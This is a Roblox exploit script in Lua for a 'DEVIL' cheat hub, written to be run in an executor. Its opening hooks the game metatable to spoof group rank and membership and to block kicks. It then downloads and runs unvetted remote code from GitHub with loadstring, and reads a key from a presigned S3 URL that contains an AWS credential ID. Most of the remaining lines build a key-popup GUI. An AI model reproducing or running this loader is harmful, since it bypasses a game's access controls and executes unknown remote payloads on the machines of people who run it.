local tx = game:HttpGet("https://s3.eu-central-1.amazonaws.com/adlocis.linkvertise.links/pastes/35870585.txt?X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIA6L5L3NKTBHJ3YVHU/20221108/eu-central-1/s3/aws4_request&X-Amz-Date=20221108T165612Z&X-Amz-SignedHeaders=host&X-Amz-Expires=432000&X-Amz-Signature=9df6bdb5915607e111772e14736d284c2fa63b3328a04bb53197c1d48a25c407"):split("- ")[2]
pcall(function()
local meta, oldm = getrawmetatable(game), {}
setreadonly(meta, false)
for i, v in next, meta do oldm[i] = v end

local fakeF = function()
  return true
end

local fakeR = function()
  return 255
end

meta.__index = function(t, k)
if k == 'GetRankInGroup' and t == game.Players.LocalPlayer then return fakeR end
    if k == 'IsInGroup' and t == game.Players.LocalPlayer then return fakeF end
        if k == 'Kick' or k == 'kick' and t == game.Players.LocalPlayer then return nil end
    return oldm.__index(t, k)
end
end)
pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/starlolq/lua-scripts/main/devildeleter"))()
end)

wait(7)

pcall(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Prajon/DEVIL-loader-remake/main/DEVIL-Hub-Script", true))()
end)

local devilkey = Instance.new("ScreenGui")
local Holder = Instance.new("Frame")
local KeyText = Instance.new("TextBox")
local shadowHolder = Instance.new("Frame")
local umbraShadow = Instance.new("ImageLabel")
local penumbraShadow = Instance.new("ImageLabel") 
local ambientShadow = Instance.new("ImageLabel")
local copy = Instance.new("TextButton")
local shadowHolder_2 = Instance.new("Frame")
local umbraShadow_2 = Instance.new("ImageLabel")
local penumbraShadow_2 = Instance.new("ImageLabel")
local ambientShadow_2 = Instance.new("ImageLabel")
local close = Instance.new("TextButton") 
local shadowHolder_3 = Instance.new("Frame")
local umbraShadow_3 = Instance.new("ImageLabel")
local penumbraShadow_3 = Instance.new("ImageLabel")
local ambientShadow_3 = Instance.new("ImageLabel")
local shadowHolder_4 = Instance.new("Frame")
local umbraShadow_4 = Instance.new("ImageLabel")
local penumbraShadow_4 = Instance.new("ImageLabel")
local ambientShadow_4 = Instance.new("ImageLabel")



devilkey.Name = "devilkey"
devilkey.Parent = game.CoreGui
devilkey.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Holder.Name = "Holder"
Holder.Parent = devilkey
Holder.Active = true
Holder.BackgroundColor3 = Color3.fromRGB(80, 121, 255)
Holder.BorderSizePixel = 0
Holder.Position = UDim2.new(0.345561266, 0, 0.268987328, 0)
Holder.Size = UDim2.new(0, 282, 0, 164)

KeyText.Name = "KeyText"
KeyText.Parent = Holder
KeyText.BackgroundColor3 = Color3.fromRGB(176, 181, 255)
KeyText.BorderSizePixel = 0
KeyText.Position = UDim2.new(0.145390064, 0, 0.0914634168, 0)
KeyText.Size = UDim2.new(0, 200, 0, 50)
KeyText.ClearTextOnFocus = false
KeyText.Font = Enum.Font.SourceSans
KeyText.Text = tx
KeyText.TextColor3 = Color3.fromRGB(0, 0, 0)
KeyText.TextScaled = true
KeyText.TextSize = 14.000
KeyText.TextWrapped = true

shadowHolder.Name = "shadowHolder"
shadowHolder.Parent = KeyText
shadowHolder.BackgroundTransparency = 1.000
shadowHolder.Size = UDim2.new(1, 0, 1, 0)
shadowHolder.ZIndex = 0

umbraShadow.Name = "umbraShadow"
umbraShadow.Parent = shadowHolder
umbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow.BackgroundTransparency = 1.000
umbraShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
umbraShadow.Size = UDim2.new(1, 2, 1, 2)
umbraShadow.ZIndex = 0
umbraShadow.Image = "rbxassetid://1316045217"
umbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow.ImageTransparency = 0.860
umbraShadow.ScaleType = Enum.ScaleType.Slice
umbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow.Name = "penumbraShadow"
penumbraShadow.Parent = shadowHolder
penumbraShadow.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow.BackgroundTransparency = 1.000
penumbraShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
penumbraShadow.Size = UDim2.new(1, 2, 1, 2)
penumbraShadow.ZIndex = 0
penumbraShadow.Image = "rbxassetid://1316045217"
penumbraShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow.ImageTransparency = 0.880
penumbraShadow.ScaleType = Enum.ScaleType.Slice
penumbraShadow.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow.Name = "ambientShadow"
ambientShadow.Parent = shadowHolder
ambientShadow.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow.BackgroundTransparency = 1.000
ambientShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
ambientShadow.Size = UDim2.new(1, 2, 1, 2)
ambientShadow.ZIndex = 0
ambientShadow.Image = "rbxassetid://1316045217"
ambientShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow.ImageTransparency = 0.880
ambientShadow.ScaleType = Enum.ScaleType.Slice
ambientShadow.SliceCenter = Rect.new(10, 10, 118, 118)

copy.Name = "copy"
copy.Parent = Holder
copy.BackgroundColor3 = Color3.fromRGB(247, 130, 255)
copy.BorderSizePixel = 0
copy.Position = UDim2.new(0.0780141801, 0, 0.621951342, 0)
copy.Size = UDim2.new(0, 111, 0, 50)
copy.Font = Enum.Font.SourceSans
copy.Text = "Copy Key"
copy.TextColor3 = Color3.fromRGB(0, 0, 0)
copy.TextSize = 14.000

shadowHolder_2.Name = "shadowHolder"
shadowHolder_2.Parent = copy
shadowHolder_2.BackgroundTransparency = 1.000
shadowHolder_2.Size = UDim2.new(1, 0, 1, 0)
shadowHolder_2.ZIndex = 0

umbraShadow_2.Name = "umbraShadow"
umbraShadow_2.Parent = shadowHolder_2
umbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow_2.BackgroundTransparency = 1.000
umbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 0)
umbraShadow_2.Size = UDim2.new(1, 2, 1, 2)
umbraShadow_2.ZIndex = 0
umbraShadow_2.Image = "rbxassetid://1316045217"
umbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow_2.ImageTransparency = 0.860
umbraShadow_2.ScaleType = Enum.ScaleType.Slice
umbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow_2.Name = "penumbraShadow"
penumbraShadow_2.Parent = shadowHolder_2
penumbraShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow_2.BackgroundTransparency = 1.000
penumbraShadow_2.Position = UDim2.new(0.5, 0, 0.5, 0)
penumbraShadow_2.Size = UDim2.new(1, 2, 1, 2)
penumbraShadow_2.ZIndex = 0
penumbraShadow_2.Image = "rbxassetid://1316045217"
penumbraShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow_2.ImageTransparency = 0.880
penumbraShadow_2.ScaleType = Enum.ScaleType.Slice
penumbraShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow_2.Name = "ambientShadow"
ambientShadow_2.Parent = shadowHolder_2
ambientShadow_2.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow_2.BackgroundTransparency = 1.000
ambientShadow_2.Position = UDim2.new(0.5, 0, 0.5, 0)
ambientShadow_2.Size = UDim2.new(1, 2, 1, 2)
ambientShadow_2.ZIndex = 0
ambientShadow_2.Image = "rbxassetid://1316045217"
ambientShadow_2.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow_2.ImageTransparency = 0.880
ambientShadow_2.ScaleType = Enum.ScaleType.Slice
ambientShadow_2.SliceCenter = Rect.new(10, 10, 118, 118)

close.Name = "close"
close.Parent = Holder
close.BackgroundColor3 = Color3.fromRGB(247, 130, 255)
close.BorderSizePixel = 0
close.Position = UDim2.new(0.517730474, 0, 0.621951342, 0)
close.Size = UDim2.new(0, 111, 0, 50)
close.Font = Enum.Font.SourceSans
close.Text = "Close"
close.TextColor3 = Color3.fromRGB(0, 0, 0)
close.TextSize = 14.000

shadowHolder_3.Name = "shadowHolder"
shadowHolder_3.Parent = close
shadowHolder_3.BackgroundTransparency = 1.000
shadowHolder_3.Size = UDim2.new(1, 0, 1, 0)
shadowHolder_3.ZIndex = 0

umbraShadow_3.Name = "umbraShadow"
umbraShadow_3.Parent = shadowHolder_3
umbraShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow_3.BackgroundTransparency = 1.000
umbraShadow_3.Position = UDim2.new(0.5, 0, 0.5, 0)
umbraShadow_3.Size = UDim2.new(1, 2, 1, 2)
umbraShadow_3.ZIndex = 0
umbraShadow_3.Image = "rbxassetid://1316045217"
umbraShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow_3.ImageTransparency = 0.860
umbraShadow_3.ScaleType = Enum.ScaleType.Slice
umbraShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow_3.Name = "penumbraShadow"
penumbraShadow_3.Parent = shadowHolder_3
penumbraShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow_3.BackgroundTransparency = 1.000
penumbraShadow_3.Position = UDim2.new(0.5, 0, 0.5, 0)
penumbraShadow_3.Size = UDim2.new(1, 2, 1, 2)
penumbraShadow_3.ZIndex = 0
penumbraShadow_3.Image = "rbxassetid://1316045217"
penumbraShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow_3.ImageTransparency = 0.880
penumbraShadow_3.ScaleType = Enum.ScaleType.Slice
penumbraShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow_3.Name = "ambientShadow"
ambientShadow_3.Parent = shadowHolder_3
ambientShadow_3.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow_3.BackgroundTransparency = 1.000
ambientShadow_3.Position = UDim2.new(0.5, 0, 0.5, 0)
ambientShadow_3.Size = UDim2.new(1, 2, 1, 2)
ambientShadow_3.ZIndex = 0
ambientShadow_3.Image = "rbxassetid://1316045217"
ambientShadow_3.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow_3.ImageTransparency = 0.880
ambientShadow_3.ScaleType = Enum.ScaleType.Slice
ambientShadow_3.SliceCenter = Rect.new(10, 10, 118, 118)

shadowHolder_4.Name = "shadowHolder"
shadowHolder_4.Parent = Holder
shadowHolder_4.BackgroundTransparency = 1.000
shadowHolder_4.Size = UDim2.new(1, 0, 1, 0)
shadowHolder_4.ZIndex = 0

umbraShadow_4.Name = "umbraShadow"
umbraShadow_4.Parent = shadowHolder_4
umbraShadow_4.AnchorPoint = Vector2.new(0.5, 0.5)
umbraShadow_4.BackgroundTransparency = 1.000
umbraShadow_4.Position = UDim2.new(0.5, 0, 0.5, 0)
umbraShadow_4.Size = UDim2.new(1, 2, 1, 2)
umbraShadow_4.ZIndex = 0
umbraShadow_4.Image = "rbxassetid://1316045217"
umbraShadow_4.ImageColor3 = Color3.fromRGB(0, 0, 0)
umbraShadow_4.ImageTransparency = 0.860
umbraShadow_4.ScaleType = Enum.ScaleType.Slice
umbraShadow_4.SliceCenter = Rect.new(10, 10, 118, 118)

penumbraShadow_4.Name = "penumbraShadow"
penumbraShadow_4.Parent = shadowHolder_4
penumbraShadow_4.AnchorPoint = Vector2.new(0.5, 0.5)
penumbraShadow_4.BackgroundTransparency = 1.000
penumbraShadow_4.Position = UDim2.new(0.5, 0, 0.5, 0)
penumbraShadow_4.Size = UDim2.new(1, 2, 1, 2)
penumbraShadow_4.ZIndex = 0
penumbraShadow_4.Image = "rbxassetid://1316045217"
penumbraShadow_4.ImageColor3 = Color3.fromRGB(0, 0, 0)
penumbraShadow_4.ImageTransparency = 0.880
penumbraShadow_4.ScaleType = Enum.ScaleType.Slice
penumbraShadow_4.SliceCenter = Rect.new(10, 10, 118, 118)

ambientShadow_4.Name = "ambientShadow"
ambientShadow_4.Parent = shadowHolder_4
ambientShadow_4.AnchorPoint = Vector2.new(0.5, 0.5)
ambientShadow_4.BackgroundTransparency = 1.000
ambientShadow_4.Position = UDim2.new(0.5, 0, 0.5, 0)
ambientShadow_4.Size = UDim2.new(1, 2, 1, 2)
ambientShadow_4.ZIndex = 0
ambientShadow_4.Image = "rbxassetid://1316045217"
ambientShadow_4.ImageColor3 = Color3.fromRGB(0, 0, 0)
ambientShadow_4.ImageTransparency = 0.880
ambientShadow_4.ScaleType = Enum.ScaleType.Slice
ambientShadow_4.SliceCenter = Rect.new(10, 10, 118, 118)


close.MouseButton1Click:Connect(function()
	for i,v in pairs(game.CoreGui:GetChildren()) do
		if v.Name == "devilkey" then
			v:Destroy()
		end
	end
end)


copy.MouseButton1Click:Connect(function()
	setclipboard(KeyText.Text)
end)





local function GQGQES_fake_script() -- Holder.Drag 
	local script = Instance.new('LocalScript', Holder)

	--Credits go to whoever made this script.
	
	local UIS = game:GetService("UserInputService")
	function drag (Frame)
		dragToggle = nil
		dragSpeed = 0.23
		dragInput = nil
		dragStart = nil
		dragPos = nil
		function updateInput(input)
			Delta = input.Position - dragStart
			Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
			game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
		end
		Frame.InputBegan:Connect(function(input)
			if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
				dragToggle = true
				dragStart = input.Position
				startPos = Frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragToggle = false
					end
				end)
			end
		end)
		Frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)
		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragToggle then
				updateInput(input)
			end
		end)
	end
	drag(script.Parent)
	
end
coroutine.wrap(GQGQES_fake_script)()
